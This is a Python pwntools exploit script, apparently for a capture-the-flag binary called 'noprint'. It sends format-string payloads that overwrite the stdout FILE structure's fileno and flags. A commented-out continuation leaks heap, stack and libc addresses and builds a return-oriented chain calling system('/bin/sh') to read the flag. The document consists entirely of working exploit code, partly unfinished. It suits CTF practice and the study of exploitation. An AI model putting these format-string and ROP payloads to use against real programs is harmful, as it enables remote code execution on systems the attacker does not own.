#!/usr/bin/env python3

from pwn import *
from subprocess import check_output

exe = ELF('noprint_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda p, data: p.send(data)
sa = lambda p, msg, data: p.sendafter(msg, data)
sl = lambda p, data: p.sendline(data)
sla = lambda p, msg, data: p.sendlineafter(msg, data)
mangle = lambda val, adrs: 	(adrs >> 12) ^ val

cmd=f'''
b* fprintf+151
b* main+157
'''

def get_pid(name):
    return int(check_output(["pgrep", "-f", "-n", name]))


def GDB():
    if args.DOCKER:
        gdb.attach(pid, exe=exe.path, 
            gdbscript=f"set sysroot /proc/{pid}/root\nfile /proc/{pid}/exe\n" + cmd)
        pause()
    else:
        gdb.attach(p, gdbscript = cmd)
        input()
'''
pwndbg> set $rdi = &_IO_2_1_stdout_
pwndbg> context
0x7fffffffd6d8
0x7fffffffd6c8 -> read
'''

if args.REMOTE:
    p = remote('')
elif args.DOCKER:
    p = remote('')
else:
    p = process([exe.path])


'''
ghi đè con trỏ 21 là fileno
'''
value = 1
flags = 0x3e84
offset_fileno = 112
#362193

p.sendlineafter(b'void\n', f'%*7$d%{507329-1000-2793}c%11$hn'.encode())
GDB()
p.sendline(b'%*2$d%362193c%31$n')

p.sendline(b'aaa')
# p.sendlineafter(b'void\n', f'%{0x3e84}c%9$hn'.encode())
# 
# p.sendline(b'%*9$d%112c%13$n')
# p.sendline(b'%c%21$hhn')
# p.sendline(b'%9$p%11$p%12$p\n\n')
# p.recvuntil(b'\n')
# heap = int(p.recv(14), 16)
# info('Heap: ' + hex(heap))
# stack = int(p.recv(14), 16)
# info('Stack: ' + hex(stack))
# libc.address = int(p.recv(14), 16) - 0x2a578
# info('Libc base: ' + hex(libc.address))
# p.sendline(f'%{(stack-0xa6) & 0xffff}c%11$hn\n\n'.encode())
# p.clean()
# p.clean()
# #reset flags and fileno
# sleep(1)
# p.sendline(f'%{0x3c84}c%9$hn\n'.encode())
# p.clean()
# p.clean()
# p.clean()
# sleep(1)
# p.sendline(b'%3c%21$n')
# p.clean()
# sleep(1)
# p.sendline(f'%{stack>>16}c%31$n'.encode())
# p.clean()
# sleep(1)
# p.sendline(f'%{(stack-0xa8) & 0xffff}c%11$hn\n\n'.encode())
# p.clean()
# sleep(1)
# p.sendline(f'%{(stack-0xd8) & 0xffff}c%31$hn'.encode())
# sleep(1)
# binsh = next(libc.search(b"/bin/sh"))
# pop_rdi = 0x119e9c + libc.address
# payload = p64(pop_rdi) + p64(binsh) + p64(pop_rdi+1) + p64(libc.sym.system)

# p.sendline(payload)
# sleep(1)
# p.sendline(b'cat flag')

p.interactive()
